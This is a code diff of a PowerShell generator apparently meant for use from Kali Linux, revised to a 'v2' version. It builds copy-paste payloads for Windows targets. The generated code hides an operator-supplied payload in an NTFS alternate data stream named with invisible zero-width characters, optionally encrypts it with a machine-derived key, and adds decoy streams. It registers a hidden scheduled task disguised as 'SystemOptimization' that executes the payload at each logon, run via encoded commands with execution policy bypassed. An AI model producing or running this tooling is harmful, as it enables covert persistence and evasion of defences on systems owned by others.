@@ -1,57 +1,40 @@
 <#
 .SYNOPSIS
-    Build-ADSOneLiner.ps1 - Generate copy-paste ADS deployment payloads (Linux → Windows)
+    Build-ADSOneLiner v2 - Simplified, minimal-footprint generator
 
 .DESCRIPTION
-    Linux-friendly generator that creates minimal PowerShell payloads for Windows targets.
-    
-    Outputs:
-    - Base64-encoded one-liner (compact, copy-paste ready)
-    - Readable multi-line version (debugging, modification)
-    
-    Manifest saved to Linux machine ONLY (never sent to Windows target).
+    Pre-computes everything on Linux, sends minimal code to Windows.
+    No unnecessary function definitions on target.
 
 .PARAMETER Payload
-    Payload content (or use -PayloadAtDeployment for runtime input)
+    Payload content (required unless -PayloadAtDeployment)
 
 .PARAMETER PayloadAtDeployment
-    Generate code that prompts for payload on Windows target
+    Prompt for payload on Windows target
 
 .PARAMETER ZeroWidthMode
-    'single', 'multi', or 'hybrid' (default: single)
+    'single', 'multi', or 'hybrid'
 
 .PARAMETER HybridPrefix
-    Prefix for hybrid mode (e.g., 'Zone.Identifier')
+    Prefix for hybrid mode
 
 .PARAMETER Persist
-    Persistence method: task, registry, wmi, none (default: task)
+    'task', 'registry', 'wmi', 'none'
 
 .PARAMETER CreateDecoys
-    Number of decoy streams (0-10, default: 0)
+    Number of decoy streams (0-10)
 
 .PARAMETER Encrypt
     Enable AES-256 encryption
 
 .PARAMETER Randomize
-    Randomize host file and stream names
+    Randomize host file name
 
 .PARAMETER OutputFile
-    Where to save generated payload (default: ads-payload.txt)
+    Where to save payload (default: ads-payload.txt)
 
 .PARAMETER ManifestDir
-    Directory for manifest on Linux (default: ./manifests)
-
-.EXAMPLE
-    # Payload at generation (Linux)
-    pwsh Build-ADSOneLiner.ps1 -Payload "IEX(...)" -ZeroWidthMode single -Persist task
-
-.EXAMPLE
-    # Payload at deployment (Windows)
-    pwsh Build-ADSOneLiner.ps1 -PayloadAtDeployment -ZeroWidthMode hybrid -CreateDecoys 3
-
-.NOTES
-    Run on Linux (Kali) with PowerShell Core (pwsh)
-    Output designed for Windows target copy-paste
+    Manifest directory on Linux (default: ./manifests)
 #>
 
 [CmdletBinding()]
@@ -77,13 +60,9 @@ param(
     [string]$ManifestDir = "./manifests"
 )
 
-Write-Host @"
-
-═══════════════════════════════════════════════════════════════
- ADS One-Liner Generator (Linux → Windows)
-═══════════════════════════════════════════════════════════════
-
-"@ -ForegroundColor Cyan
+Write-Host "`n═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host " ADS One-Liner Generator v2 (Optimized)" -ForegroundColor Cyan
+Write-Host "═══════════════════════════════════════════════════════════════`n" -ForegroundColor Cyan
 
 # Validate
 if (-not $Payload -and -not $PayloadAtDeployment) {
@@ -91,267 +70,234 @@ if (-not $Payload -and -not $PayloadAtDeployment) {
     exit 1
 }
 
-if ($Payload -and $PayloadAtDeployment) {
-    Write-Error "Cannot use both -Payload and -PayloadAtDeployment"
-    exit 1
-}
+#region Pre-Compute on Linux
 
-#region Core Functions (Minimal for deployment)
+Write-Host "[*] Pre-computing configuration on Linux..." -ForegroundColor White
 
-$coreFunctions = @'
-# Zero-Width Character Database
-$script:ZWC = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E,0x2060,0xFEFF)
+# Zero-width character set
+$zwChars = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E,0x2060,0xFEFF)
 
-function Generate-ZeroWidthStream {
-    param([string]$Mode='single',[string]$Prefix,[int]$Length=3)
-    switch ($Mode) {
-        'single' { [char]($script:ZWC|Get-Random) }
-        'multi' { -join (1..$Length|%{[char]($script:ZWC|Get-Random)}) }
-        'hybrid' {
-            if (!$Prefix) { $Prefix=@('Zone.Identifier','Summary','Comments')|Get-Random }
-            "$Prefix$([char]($script:ZWC|Get-Random))"
-        }
-        default { -join ((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_}) }
+# Generate stream name HERE on Linux
+$streamName = switch ($ZeroWidthMode) {
+    'single' {
+        [char]($zwChars | Get-Random)
+    }
+    'multi' {
+        -join (1..3 | ForEach-Object { [char]($zwChars | Get-Random) })
+    }
+    'hybrid' {
+        $prefix = if ($HybridPrefix) { $HybridPrefix } else { 'Zone.Identifier' }
+        $suffix = [char]($zwChars | Get-Random)
+        "$prefix$suffix"
     }
 }
 
-function Get-HostDerivedKey {
-    try {
-        $h=@($env:COMPUTERNAME,(Get-WmiObject Win32_ComputerSystemProduct -EA 0).UUID,(Get-WmiObject Win32_BaseBoard -EA 0).SerialNumber)-join'|'
-        $sha=[System.Security.Cryptography.SHA256]::Create()
-        $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($h))
-    } catch {
-        [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
-    }
+# Get codepoints for manifest
+$streamChars = $streamName.ToCharArray()
+$codepoints = ($streamChars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
+
+# Convert stream name to Unicode escape sequence for embedding
+# This ensures it survives string interpolation
+$streamNameEscaped = -join ($streamChars | ForEach-Object {
+    "\u{0:X4}" -f [int]$_
+})
+
+# Generate host path
+$hostPath = if ($Randomize) {
+    'C:\ProgramData\' + (-join ((65..90)+(97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })) + '.dat'
+} else {
+    'C:\ProgramData\SystemCache.dat'
 }
 
-function Protect-Payload {
-    param([string]$PlainText,[byte[]]$Key)
-    $aes=[System.Security.Cryptography.Aes]::Create()
-    $aes.Key=$Key;$aes.GenerateIV()
-    $enc=$aes.CreateEncryptor()
-    $pb=[System.Text.Encoding]::UTF8.GetBytes($PlainText)
-    $eb=$enc.TransformFinalBlock($pb,0,$pb.Length)
-    [Convert]::ToBase64String($aes.IV+$eb)
-}
-
-function Unprotect-Payload {
-    param([string]$EncryptedData,[byte[]]$Key)
-    $eb=[Convert]::FromBase64String($EncryptedData)
-    $aes=[System.Security.Cryptography.Aes]::Create()
-    $aes.Key=$Key;$aes.IV=$eb[0..15]
-    $dec=$aes.CreateDecryptor()
-    $ct=$eb[16..($eb.Length-1)]
-    $pb=$dec.TransformFinalBlock($ct,0,$ct.Length)
-    [System.Text.Encoding]::UTF8.GetString($pb)
-}
-
-function Create-DecoyStreams {
-    param([string]$HostPath,[int]$Count)
-    if ($Count -le 0){return}
-    $n=@(':Zone.Identifier',':Summary',':Comments',':Author')
-    $c=@("[ZoneTransfer]`r`nZoneId=3",'Document summary','Internal use')
-    0..[Math]::Min($Count-1,$n.Count-1)|%{$c|Get-Random|Set-Content "$HostPath$($n[$_])" -Force}
-}
-'@
-
-#endregion
-
-#region Generate Configuration
-
-Write-Host "[*] Generating configuration..." -ForegroundColor White
-
-$config = @{
-    HostPath = if ($Randomize) {
-        'C:\ProgramData\'+(-join((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_}))+'.dat'
-    } else {
-        'C:\ProgramData\SystemCache.dat'
-    }
-    ZeroWidthMode = $ZeroWidthMode
-    HybridPrefix = $HybridPrefix
-    Persist = $Persist
-    CreateDecoys = $CreateDecoys
-    Encrypt = $Encrypt.IsPresent
-    Randomize = $Randomize.IsPresent
-    PayloadAtDeployment = $PayloadAtDeployment.IsPresent
-}
-
-# Simulate stream name generation for manifest
-if (-not $PayloadAtDeployment) {
-    $zwc = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E,0x2060,0xFEFF)
-    $config.StreamName = switch ($ZeroWidthMode) {
-        'single' { [char]($zwc|Get-Random) }
-        'multi' { -join(1..3|%{[char]($zwc|Get-Random)}) }
-        'hybrid' {
-            $p=if($HybridPrefix){$HybridPrefix}else{'Zone.Identifier'}
-            "$p$([char]($zwc|Get-Random))"
-        }
-        default { 'payload' }
-    }
+# Generate decoy names if needed
+$decoyNames = @()
+if ($CreateDecoys -gt 0) {
+    $availableDecoys = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
+    $decoyContent = @("[ZoneTransfer]`r`nZoneId=3", 'Document summary', 'Internal use only')
     
-    $chars = $config.StreamName.ToCharArray()
-    $config.Codepoints = ($chars|%{"U+{0:X4}" -f [int]$_})-join' '
+    for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $availableDecoys.Count); $i++) {
+        $decoyNames += @{
+            Name = $availableDecoys[$i]
+            Content = $decoyContent | Get-Random
+        }
+    }
 }
 
-Write-Host "[+] Configuration generated" -ForegroundColor Green
-Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
-if ($config.Codepoints) {
-    Write-Host "    Stream Codepoints: $($config.Codepoints)" -ForegroundColor Yellow
-}
+Write-Host "[+] Configuration complete" -ForegroundColor Green
+Write-Host "    Host: $hostPath" -ForegroundColor Gray
+Write-Host "    Stream: <zero-width> (Codepoints: $codepoints)" -ForegroundColor Gray
+Write-Host "    Decoys: $CreateDecoys" -ForegroundColor Gray
 
 #endregion
 
-#region Build Deployment Script
+#region Build Minimal Windows Payload
 
-Write-Host "[*] Building deployment script..." -ForegroundColor White
+Write-Host "[*] Building minimal Windows payload..." -ForegroundColor White
 
-$deployScript = @"
-$coreFunctions
+if ($Encrypt) {
+    # If encryption needed, we DO need minimal functions
+    $minimalCode = @"
+# Host-derived AES key
+`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join'|'
+`$k=[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))
 
-`$hp='$($config.HostPath)'
-`$zw='$($config.ZeroWidthMode)'
-`$zp='$($config.HybridPrefix)'
-`$ps='$($config.Persist)'
-`$cd=$($config.CreateDecoys)
-`$en=`$$($config.Encrypt)
+# Encrypt function
+function enc(`$t,`$k){`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.GenerateIV();`$e=`$a.CreateEncryptor();`$p=[Text.Encoding]::UTF8.GetBytes(`$t);`$b=`$e.TransformFinalBlock(`$p,0,`$p.Length);[Convert]::ToBase64String(`$a.IV+`$b)}
 
-`$sn=Generate-ZeroWidthStream -Mode `$zw -Prefix `$zp
-if(!(Test-Path `$hp)){New-Item `$hp -ItemType File -Force|Out-Null}
+# Decrypt function
+function dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)}
+"@
+} else {
+    $minimalCode = ""
+}
 
+# Main deployment code
+$deployCode = @"
+$minimalCode
+
+# Config
+`$hp='$hostPath'
+`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))
 "@
 
 if ($PayloadAtDeployment) {
-    $deployScript += "`$pl=Read-Host 'Enter payload'`n"
+    $deployCode += @"
+
+`$pl=Read-Host 'Enter payload'
+"@
 } else {
-    $esc = $Payload -replace "'","''" -replace '"','\"'
-    $deployScript += "`$pl='$esc'`n"
+    $escapedPayload = $Payload -replace "'","''" -replace '\\','\\'
+    $deployCode += @"
+
+`$pl='$escapedPayload'
+"@
 }
 
-$deployScript += @"
+# Encryption handling
+if ($Encrypt) {
+    $deployCode += @"
 
-if(`$en){
-    `$k=Get-HostDerivedKey
-    `$pl=Protect-Payload -PlainText `$pl -Key `$k
+`$pl=enc `$pl `$k
+"@
 }
 
-`$pl|Set-Content "`$hp`:`$sn" -Force
+# Create host file and write ADS
+$deployCode += @"
 
-if(`$cd -gt 0){Create-DecoyStreams -HostPath `$hp -Count `$cd}
+if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
+`$pl|sc ("`$hp`:"+`$sn) -Force
+"@
 
-if(`$ps -ne 'none'){
-    `$ld=if(`$en){"```$k=Get-HostDerivedKey;```$e=Get-Content '`$hp`:`$sn' -Raw;```$p=Unprotect-Payload -EncryptedData ```$e -Key ```$k;IEX ```$p"}else{"```$p=Get-Content '`$hp`:`$sn' -Raw;IEX ```$p"}
-    
-    if(`$ps -eq 'task'){
-        `$tn='SystemOptimization'
-        `$lp="`$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8)).ps1"
-        `$ld|Out-File `$lp -Encoding UTF8
-        `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -NoProfile -Command `$ld"
-        `$t=New-ScheduledTaskTrigger -AtLogOn
-        `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
-        Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
+# Add decoys
+if ($CreateDecoys -gt 0) {
+    foreach ($decoy in $decoyNames) {
+        $deployCode += @"
+
+'$($decoy.Content)'|sc "`$hp`:$($decoy.Name)" -Force
+"@
     }
 }
+
+# Persistence
+if ($Persist -eq 'task') {
+    if ($Encrypt) {
+        $loaderCmd = "```$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join'|'));function dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};IEX(dec (gc '`$hp`:'+[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" })) -Raw) ```$k)"
+    } else {
+        $loaderCmd = "IEX(gc '`$hp`:'+[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" })) -Raw)"
+    }
+    
+    $deployCode += @"
+
+`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-W Hidden -NoP -C `"$loaderCmd`""
+`$t=New-ScheduledTaskTrigger -AtLogOn
+`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
+Register-ScheduledTask -TaskName 'SystemOptimization' -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
+"@
+}
+
+$deployCode += @"
 
 Write-Host '[+] Deployment complete' -ForegroundColor Green
 "@
 
 #endregion
 
-#region Generate Output Formats
+#region Generate Outputs
 
 Write-Host "[*] Generating output formats..." -ForegroundColor White
 
 # Base64 encode
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($deployScript)
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($deployCode)
 $encoded = [Convert]::ToBase64String($bytes)
 
-# Build output
+# Build output file
 $output = @"
 ═══════════════════════════════════════════════════════════════
- ADS Deployment Payload
+ ADS Deployment Payload (v2 - Optimized)
  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 ═══════════════════════════════════════════════════════════════
 
 CONFIGURATION:
-  Host File: $($config.HostPath)
-  Zero-Width: $($config.ZeroWidthMode)$(if($config.HybridPrefix){" (prefix: $($config.HybridPrefix))"})
-  Persistence: $($config.Persist)
-  Decoys: $($config.CreateDecoys)
-  Encryption: $($config.Encrypt)
-  Payload Input: $(if($PayloadAtDeployment){'At Deployment'}else{'At Generation'})
-
-$(if($config.Codepoints){
-@"
-MANIFEST (Linux-side):
-  Stream Codepoints: $($config.Codepoints)
-  Byte Sequence: Will be logged in manifest file
-  Recovery Command: ConvertFrom-Codepoints -Codepoints '$($config.Codepoints)'
-"@
-})
+  Host File: $hostPath
+  Stream Name: <zero-width>
+  Codepoints: $codepoints
+  Zero-Width Mode: $ZeroWidthMode
+  Persistence: $Persist
+  Decoys: $CreateDecoys
+  Encryption: $Encrypt
+  Randomized: $Randomize
+  
+PAYLOAD SIZE:
+  Readable: $($deployCode.Length) characters
+  Encoded: $($encoded.Length) characters
 
 ═══════════════════════════════════════════════════════════════
- OPTION 1: Base64 Encoded One-Liner (Recommended)
+ OPTION 1: Base64 Encoded One-Liner
 ═══════════════════════════════════════════════════════════════
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded
 
 ═══════════════════════════════════════════════════════════════
- OPTION 2: Readable Multi-Line Version (For Debugging)
+ OPTION 2: Readable Multi-Line Version
 ═══════════════════════════════════════════════════════════════
 
-$deployScript
+$deployCode
 
 ═══════════════════════════════════════════════════════════════
- USAGE ON WINDOWS TARGET:
+ USAGE:
 ═══════════════════════════════════════════════════════════════
 
-1. Open PowerShell on Windows target (as admin if needed)
-2. Copy-paste OPTION 1 (one-liner) or OPTION 2 (multi-line)
+1. Copy OPTION 1 or OPTION 2
+2. Paste into PowerShell on Windows target
 3. Press Enter
-$(if($PayloadAtDeployment){"4. Enter your payload when prompted"})
+$(if ($PayloadAtDeployment) { "4. Enter payload when prompted" })
 
 ═══════════════════════════════════════════════════════════════
- CLEANUP (After Operation):
+ CLEANUP:
 ═══════════════════════════════════════════════════════════════
 
-# View ADS
-Get-Item '$($config.HostPath)' -Stream *
-
-$(if($config.Codepoints){
-@"
-# Recover stream name
-`$sn = ConvertFrom-Codepoints -Codepoints '$($config.Codepoints)'
-Remove-Item '$($config.HostPath)':`$sn -Force
-"@
-} else {
-@"
-# If using zero-width (codepoints logged in manifest)
-# Get codepoints from manifest, then:
-# `$sn = ConvertFrom-Codepoints -Codepoints '<from_manifest>'
-# Remove-Item '$($config.HostPath)':`$sn -Force
-"@
-})
+# Remove ADS (using codepoints from manifest)
+`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))
+Remove-Item "$hostPath`:"+`$sn -Force
 
 # Remove task
 Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:`$false
 
 # Remove host file
-Remove-Item '$($config.HostPath)' -Force
+Remove-Item '$hostPath' -Force
 
 ═══════════════════════════════════════════════════════════════
-
 "@
 
-# Save output
 $output | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
 Write-Host "[+] Payload saved to: $OutputFile" -ForegroundColor Green
 
 #endregion
 
-#region Save Manifest (Linux Only)
+#region Save Manifest
 
 if (-not $PayloadAtDeployment) {
-    Write-Host "[*] Saving manifest to Linux machine..." -ForegroundColor White
+    Write-Host "[*] Saving manifest..." -ForegroundColor White
     
     if (-not (Test-Path $ManifestDir)) {
         New-Item -Path $ManifestDir -ItemType Directory -Force | Out-Null
@@ -362,58 +308,45 @@ if (-not $PayloadAtDeployment) {
     
     $manifest = @{
         Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
-        TargetHost = "UNKNOWN_WINDOWS_TARGET"
-        HostPath = $config.HostPath
-        StreamName = $config.StreamName
-        Codepoints = $config.Codepoints
-        ByteSequence = ([System.Text.Encoding]::Unicode.GetBytes($config.StreamName) | 
-                        ForEach-Object { "0x{0:X2}" -f $_ }) -join ' '
-        ZeroWidthMode = $config.ZeroWidthMode
-        HybridPrefix = $config.HybridPrefix
-        Persistence = $config.Persist
-        Encrypted = $config.Encrypt
-        DecoysCount = $config.CreateDecoys
-        PayloadHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new(
-            [System.Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
+        HostPath = $hostPath
+        StreamName = $streamName
+        Codepoints = $codepoints
+        StreamNameEscaped = $streamNameEscaped
+        ByteSequence = -join ($streamChars | ForEach-Object { "0x{0:X2} " -f [int]$_ })
+        ZeroWidthMode = $ZeroWidthMode
+        Persistence = $Persist
+        Encrypted = $Encrypt.IsPresent
+        DecoysCount = $CreateDecoys
+        PayloadHash = if ($Payload) {
+            (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
+        } else { "N/A (runtime payload)" }
         Operator = $env:USER
         GeneratedOn = hostname
-        GeneratedFrom = $PSCommandPath
         OutputFile = $OutputFile
+        RecoveryCommand = "`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))"
     }
     
     $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
     
     Write-Host "[+] Manifest saved to: $manifestFile" -ForegroundColor Green
-    Write-Host "    Keep this safe for recovery!" -ForegroundColor Yellow
 }
 
 #endregion
 
 #region Summary
 
-Write-Host @"
+Write-Host "`n═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host " SUMMARY" -ForegroundColor Cyan
+Write-Host "═══════════════════════════════════════════════════════════════`n" -ForegroundColor Cyan
 
-═══════════════════════════════════════════════════════════════
- SUMMARY
-═══════════════════════════════════════════════════════════════
+Write-Host "✓ Minimal payload generated (no unnecessary functions)" -ForegroundColor Green
+Write-Host "✓ Stream name pre-computed on Linux" -ForegroundColor Green
+Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
+if (-not $PayloadAtDeployment) {
+    Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
+}
 
-✓ Deployment payload generated
-✓ Output saved to: $OutputFile
-$(if(-not $PayloadAtDeployment){"✓ Manifest saved to: $ManifestDir"})
-
-NEXT STEPS:
-1. Review $OutputFile
-2. Copy OPTION 1 (base64) or OPTION 2 (readable) to Windows target  
-3. Execute on target
-$(if(-not $PayloadAtDeployment){"4. Keep manifest safe for stream recovery"})
-
-WARNING: Zero-width streams cannot be copy-pasted!
-         Always save the manifest for recovery.
-
-═══════════════════════════════════════════════════════════════
-
-"@ -ForegroundColor Cyan
+Write-Host "`nREADY TO DEPLOY!" -ForegroundColor Magenta
+Write-Host "Copy-paste to Windows target and execute.`n" -ForegroundColor White
 
 #endregion
-
-
